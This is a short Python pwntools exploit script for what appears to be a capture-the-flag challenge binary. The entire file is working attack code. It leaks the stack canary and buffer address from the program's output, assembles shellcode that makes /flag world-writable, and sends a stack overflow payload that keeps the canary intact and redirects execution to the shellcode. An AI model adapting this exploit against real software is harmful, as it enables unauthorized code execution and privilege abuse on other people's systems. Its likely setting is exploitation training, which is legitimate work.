#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-5-0')

buff_len = 64
io = elf.process()
io.sendline("512")
io.sendline("REPEAT")
io.recvuntil(b"the canary value is now 0x")
temp = io.recvuntil(b'.').decode()[:-1]
print("CANARY = " + temp)
CANARY = p64(int(temp,16))
SHELLCODE = asm(shellcraft.chmod("/flag", 0o777))
io.recvuntil(b"The input buffer begins at 0x")
MAGIC = p64(0x010000005a)
buff_str = io.recvuntil(b',').decode()[:-1]
buff_addr = p64(int(buff_str,16))
print("BUFFER = " +buff_str)
to_table=56-len(SHELLCODE)

PADDING_TABLE = b'A'*to_table
PADDING_CANARY = b'B'*(8)

PAYLOAD = SHELLCODE + PADDING_TABLE + MAGIC + PADDING_CANARY + CANARY + p64(0xffffffffffffffff) +p64(0xffffffffffffffff)+p64(0xffffffffffffffff)+buff_addr
io.sendline(f"{len(PAYLOAD)}")
io.sendline(PAYLOAD)
io.interactive()
